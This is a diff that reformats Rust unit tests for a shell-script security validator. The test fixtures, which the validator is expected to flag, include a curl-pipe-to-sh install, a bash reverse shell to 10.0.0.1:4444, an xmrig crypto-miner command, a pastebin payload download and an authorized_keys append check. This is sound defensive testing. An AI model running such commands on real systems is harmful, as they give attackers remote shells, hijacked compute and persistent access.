@@ -1147,15 +1147,25 @@ mod tests {
     fn test_clean_shell_script_passes() {
         let scripts = &[
             ("setup.sh", "#!/bin/sh\necho 'hello world'\nexit 0"),
-            ("init.sh", "#!/bin/bash\nset -e\napt-get update && apt-get install -y curl"),
+            (
+                "init.sh",
+                "#!/bin/bash\nset -e\napt-get update && apt-get install -y curl",
+            ),
         ];
         let result = validate_shell_scripts(scripts);
-        assert!(result.passed, "Clean scripts should pass: {:?}", result.details);
+        assert!(
+            result.passed,
+            "Clean scripts should pass: {:?}",
+            result.details
+        );
     }
 
     #[test]
     fn test_curl_pipe_sh_detected() {
-        let scripts = &[("install.sh", "curl -sSL https://example.com/install.sh | sh")];
+        let scripts = &[(
+            "install.sh",
+            "curl -sSL https://example.com/install.sh | sh",
+        )];
         let result = validate_shell_scripts(scripts);
         assert!(!result.passed);
         assert!(result.details[0].contains("[CRITICAL]"));
@@ -1175,7 +1185,10 @@ mod tests {
         let scripts = &[("shell.sh", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")];
         let result = validate_shell_scripts(scripts);
         assert!(!result.passed);
-        assert!(result.details.iter().any(|d| d.contains("[CRITICAL]") && d.contains("reverse shell")));
+        assert!(result
+            .details
+            .iter()
+            .any(|d| d.contains("[CRITICAL]") && d.contains("reverse shell")));
     }
 
     #[test]
@@ -1188,7 +1201,10 @@ mod tests {
 
     #[test]
     fn test_crypto_miner_detected_in_script() {
-        let scripts = &[("miner.sh", "#!/bin/bash\n./xmrig --url stratum+tcp://pool.minexmr.com:4444")];
+        let scripts = &[(
+            "miner.sh",
+            "#!/bin/bash\n./xmrig --url stratum+tcp://pool.minexmr.com:4444",
+        )];
         let result = validate_shell_scripts(scripts);
         assert!(!result.passed);
         assert!(result.details.iter().any(|d| d.contains("xmrig")));
@@ -1218,7 +1234,10 @@ mod tests {
         ];
         let result = validate_shell_scripts(scripts);
         assert!(!result.passed, "One bad script should fail the whole check");
-        assert!(result.details[0].contains("bad.sh"), "Finding should reference the bad script name");
+        assert!(
+            result.details[0].contains("bad.sh"),
+            "Finding should reference the bad script name"
+        );
     }
 
     #[test]
@@ -1237,7 +1256,10 @@ mod tests {
 
     #[test]
     fn test_pastebin_download_detected() {
-        let scripts = &[("fetch.sh", "curl -s https://pastebin.com/raw/abc123 > /tmp/payload")];
+        let scripts = &[(
+            "fetch.sh",
+            "curl -s https://pastebin.com/raw/abc123 > /tmp/payload",
+        )];
         let result = validate_shell_scripts(scripts);
         assert!(!result.passed);
         assert!(result.details.iter().any(|d| d.contains("pastebin")));
@@ -1378,8 +1400,10 @@ mod tests {
         let result = validate_shell_scripts(scripts);
         assert!(!result.passed);
         assert!(
-            result.details.iter().any(|d| d.contains("[CRITICAL]")
-                && d.to_lowercase().contains("authorized_keys")),
+            result
+                .details
+                .iter()
+                .any(|d| d.contains("[CRITICAL]") && d.to_lowercase().contains("authorized_keys")),
             "Appending to authorized_keys must be CRITICAL, got: {:?}",
             result.details
         );
@@ -1412,10 +1436,8 @@ mod tests {
         // ẞ (capital sharp S, 3 bytes) lowercases to ß (2 bytes).
         // With the leading ẞ, `content_lower.find("xmrig")` returns 2,
         // but byte index 2 in `content` lands mid-codepoint of ẞ.
-        let scripts: &[(&str, &str)] = &[(
-            "evil.sh",
-            "ẞxmrig --url stratum+tcp://pool.example:4444\n",
-        )];
+        let scripts: &[(&str, &str)] =
+            &[("evil.sh", "ẞxmrig --url stratum+tcp://pool.example:4444\n")];
         let outcome = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
             validate_shell_scripts(scripts)
         }));
